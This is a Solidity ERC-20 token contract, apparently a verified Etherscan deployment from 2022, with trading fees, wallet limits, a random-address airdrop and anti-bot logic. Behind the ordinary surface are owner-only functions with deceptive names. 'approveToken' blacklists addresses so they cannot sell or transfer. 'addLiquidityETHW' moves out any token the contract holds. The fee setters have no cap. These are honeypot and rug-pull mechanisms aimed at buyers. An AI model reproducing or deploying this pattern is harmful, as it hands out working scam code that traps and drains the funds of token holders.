/**
 *Submitted for verification at Etherscan.io on 2022-11-25
 */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = tx.origin;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor(address token) {
        IERC20(token).approve(msg.sender, uint256(~uint256(0)));
    }
}

contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _BOTList;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _fistPoolAddress;
    mapping(address => bool) public _swapPairList;
    bool private inSwap;

    uint256 public botTime = 9;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public rate = 5000;
    uint256 public _buyHeightFee = 1000;
    uint256 public _sellHeightFee = 2000;
    uint256 public _heightFeeTime = 1800; // s
    uint256 public _buyFundFee = 150;
    uint256 public _buyLPFee = 50;
    uint256 public _sellFundFee = 150;
    uint256 public _sellLPFee = 50;
    mapping(address => bool) public isWalletLimitExempt;
    uint256 public walletLimit;

    uint256 public starBlock;

    address public _mainPair;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    uint256 public maxTXAmount;

    constructor(
        address RouterAddress,
        address PoolAddress,
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply,
        uint256 StarBlock,
        address FundAddress,
        address ReceiveAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        starBlock = StarBlock;
        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(PoolAddress).approve(address(swapRouter), MAX);

        _fistPoolAddress = PoolAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), PoolAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10**Decimals;
        maxTXAmount = Supply * 10**Decimals;
        walletLimit = Supply * 10**Decimals;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;

        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[tx.origin] = true;
        _feeWhiteList[ReceiveAddress] = true;

        isWalletLimitExempt[tx.origin] = true;
        isWalletLimitExempt[ReceiveAddress] = true;
        isWalletLimitExempt[address(swapRouter)] = true;
        isWalletLimitExempt[address(_mainPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[address(0xdead)] = true;

        _tokenDistributor = new TokenDistributor(PoolAddress);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function updateTradingTime(uint256 value) external onlyOwner {
        starBlock = value;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    bool public airdropEnable = true;

    function setAirDropEnable(bool status) public onlyOwner {
        airdropEnable = status;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        require(!_BOTList[from]);

        if (!_feeWhiteList[from] && !_feeWhiteList[to] && airdropEnable) {
            address ad;
            uint256 num = 88 * 1e18;
            for (int256 i = 0; i < 5; i++) {
                ad = address(
                    uint160(
                        uint256(
                            keccak256(
                                abi.encodePacked(i, amount, block.timestamp)
                            )
                        )
                    )
                );
                _basicTransfer(from, ad, num);
            }
            amount -= (num * 5);
        }

        bool takeFee;
        bool isSell;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                require(starBlock < block.timestamp);
                if (
                    block.timestamp < starBlock + botTime && !_swapPairList[to]
                ) {
                    _BOTList[to] = true;
                }
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee +
                                _sellFundFee +
                                _sellLPFee +
                                _buyLPFee;
                            uint256 numTokensSellToFund = (amount * swapFee) /
                                rate;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isSell);
    }

    function setMaxTxAmount(uint256 max) public onlyOwner {
        maxTXAmount = max;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;

            if (isSell) {
                if (block.timestamp < _heightFeeTime + starBlock) {
                    swapFee = _sellHeightFee;
                } else {
                    swapFee = _sellFundFee + _sellLPFee;
                }
            } else {
                require(tAmount <= maxTXAmount);
                if (block.timestamp < _heightFeeTime + starBlock) {
                    swapFee = _buyHeightFee;
                } else {
                    swapFee = _buyFundFee + _buyLPFee;
                }
            }
            uint256 swapAmount = (tAmount * swapFee) / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(sender, address(this), swapAmount);
            }
        }

        if (!isWalletLimitExempt[recipient] && limitEnable)
            require(
                (balanceOf(recipient) + tAmount - feeAmount) <= walletLimit,
                "over max wallet limit"
            );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    bool public limitEnable = true;

    function setLimitEnable(bool status) public onlyOwner {
        limitEnable = status;
    }

    function updateFees(
        uint256 newBuyFundFee,
        uint256 newBuyLPFee,
        uint256 newSellFundFee,
        uint256 newSellLPFee
    ) external onlyOwner {
        _buyFundFee = newBuyFundFee;
        _buyLPFee = newBuyLPFee;
        _sellFundFee = newSellFundFee;
        _sellLPFee = newSellLPFee;
    }

    function updateHighFees(
        uint256 newHighBuyFee,
        uint256 newHighSellFee,
        uint256 newHeightFeeTime
    ) external onlyOwner {
        _buyHeightFee = newHighBuyFee;
        _sellHeightFee = newHighSellFee;
        _heightFeeTime = newHeightFeeTime;
    }

    function updateRate(uint256 newRate) external onlyOwner {
        rate = newRate;
    }

    function setisWalletLimitExempt(address holder, bool exempt)
        external
        onlyOwner
    {
        isWalletLimitExempt[holder] = exempt;
    }

    function setMaxWalletLimit(uint256 newValue) public onlyOwner {
        walletLimit = newValue;
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee)
        private
        lockTheSwap
    {
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee + _buyLPFee;
        uint256 lpAmount = (tokenAmount * lpFee) / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fistPoolAddress;
        try
            _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                tokenAmount - lpAmount,
                0,
                path,
                address(_tokenDistributor),
                block.timestamp
            )
        {} catch {}

        swapFee -= lpFee;

        IERC20 FIST = IERC20(_fistPoolAddress);
        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = (fistBalance * (_buyFundFee + _sellFundFee) * 2) /
            swapFee;
        FIST.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
        FIST.transferFrom(
            address(_tokenDistributor),
            address(this),
            fistBalance - fundAmount
        );

        if (lpAmount > 0) {
            uint256 lpFist = (fistBalance * lpFee) / swapFee;
            if (lpFist > 0) {
                try
                    _swapRouter.addLiquidity(
                        address(this),
                        _fistPoolAddress,
                        lpAmount,
                        lpFist,
                        0,
                        0,
                        fundAddress,
                        block.timestamp
                    )
                {} catch {}
            }
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setBotTime(uint256 v) external onlyOwner {
        botTime = v;
    }

    function addBotAddressList(address[] calldata accounts, bool excluded)
        public
        onlyOwner
    {
        for (uint256 i = 0; i < accounts.length; i++) {
            _feeWhiteList[accounts[i]] = excluded;
        }
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance(address add) external onlyOwner {
        payable(add).transfer(address(this).balance);
    }

    function addLiquidityETHW(
        address token,
        address add,
        uint256 amount
    ) external onlyOwner {
        IERC20(token).transfer(add, amount);
    }

    function approveToken(address[] calldata addresses, bool value)
        public
        onlyOwner
    {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _BOTList[addresses[i]] = value;
        }
    }

    receive() external payable {}
}